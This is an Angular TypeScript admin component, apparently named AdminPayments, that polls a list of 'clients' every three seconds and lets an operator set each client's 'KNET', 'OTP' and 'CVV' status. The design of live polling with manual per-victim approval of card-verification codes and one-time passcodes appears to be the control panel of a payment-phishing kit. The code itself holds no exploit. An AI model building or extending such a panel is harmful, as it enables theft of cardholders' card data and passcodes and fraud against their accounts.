import { Component, OnInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { AdminService } from '../../services/admin.service';
import { timer, Subscription, switchMap } from 'rxjs';

@Component({
  selector: 'app-admin-payments',
  standalone: true,
  imports: [CommonModule],
  templateUrl: './admin-payments.html',
  styleUrl: './admin-payments.css',
})
export class AdminPayments implements OnInit, OnDestroy {
  clients: any[] = [];
  private pollSubscription!: Subscription;

  constructor(private adminService: AdminService) {}

  ngOnInit() {
    // Poll every 3 seconds (3000ms), starting immediately (0ms)
    this.pollSubscription = timer(0, 3000).pipe(
      switchMap(() => this.adminService.getAllClients())
    ).subscribe({
      next: (data) => {
        this.clients = data;
      },
      error: (err) => {
        console.error('Error fetching clients:', err);
      }
    });
  }

  ngOnDestroy() {
    if (this.pollSubscription) {
      this.pollSubscription.unsubscribe();
    }
  }

  fetchClients() {
    this.adminService.getAllClients().subscribe({
      next: (data) => {
        this.clients = data;
      },
      error: (err) => {
        console.error('Error fetching clients:', err);
      }
    });
  }

  updateKnetStatus(id: string, status: string) {
    this.adminService.updateKnetStatus(id, status).subscribe({
      next: () => this.fetchClients(),
      error: (err) => console.error('Error updating knet:', err)
    });
  }

  updateOtpStatus(id: string, status: string) {
    this.adminService.updateOtpStatus(id, status).subscribe({
      next: () => this.fetchClients(),
      error: (err) => console.error('Error updating otp:', err)
    });
  }

  updateCvvStatus(id: string, status: string) {
    this.adminService.updateCvvStatus(id, status).subscribe({
      next: () => this.fetchClients(),
      error: (err) => console.error('Error updating cvv:', err)
    });
  }
}
